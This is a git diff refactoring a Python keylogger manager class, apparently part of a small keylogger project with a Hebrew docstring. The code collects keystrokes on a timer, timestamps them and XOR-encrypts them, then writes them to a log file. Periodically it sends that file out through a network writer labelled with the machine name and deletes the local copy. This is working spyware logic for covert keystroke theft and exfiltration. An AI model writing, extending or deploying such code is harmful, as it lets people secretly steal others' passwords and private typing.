@@ -3,10 +3,9 @@ import socket
 import os
 from datetime import datetime
 import KeyLoggerService as ks
-import file_writer as fw
+import Iwriter
 import Encryptor as enc
 import threading
-import NetworkWriter as nw
 
 
 
@@ -14,8 +13,7 @@ class KeyLoggerManager:
 
     def __init__(self, interval=10, writer="file"):
         self.keylogger_service = ks.KeyLoggerService()
-        self.file_writer = fw.FileWriter()
-        self.network_writer = nw.NetworkWriter()
+        self.writer: Iwriter.IWriter = []
         self.interval = interval
         self.buffer = []
         self.running = False
@@ -33,11 +31,12 @@ class KeyLoggerManager:
     def process_and_store_data(self):
         """ מעבדת את הנתונים, מוסיפה חותמת זמן, מצפינה ושומרת"""
         if self.buffer:
+            self.writer = Iwriter.FileWriter()
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             data = "".join(self.buffer)
             processed_data = (f"{timestamp}, {data}\n")
             encrypted_data = enc.Encryptor.xor_encryption_and_decryption(processed_data)
-            self.file_writer.send_data(encrypted_data,self.machine_name)
+            self.writer.send_data(encrypted_data,self.machine_name)
             # self.network_writer.send_data(encrypted_data, machine_name)
             self.buffer.clear()
 
@@ -50,13 +49,14 @@ class KeyLoggerManager:
             time.sleep(self.interval)
             self.collect_keystrokes()
             self.process_and_store_data()
+            self.writer = Iwriter.NetworkWriter()
             check_last_send -= 1
             if not check_last_send:
                 data = ""
                 if os.path.isfile(self.log_file):
                     with open(self.log_file, "r", encoding="utf-8") as f:
                         data += f.read()
-                    self.network_writer.send_data(data, self.machine_name)
+                    self.writer.send_data(data, self.machine_name)
                     os.remove(self.log_file)
                 check_last_send = 36
 
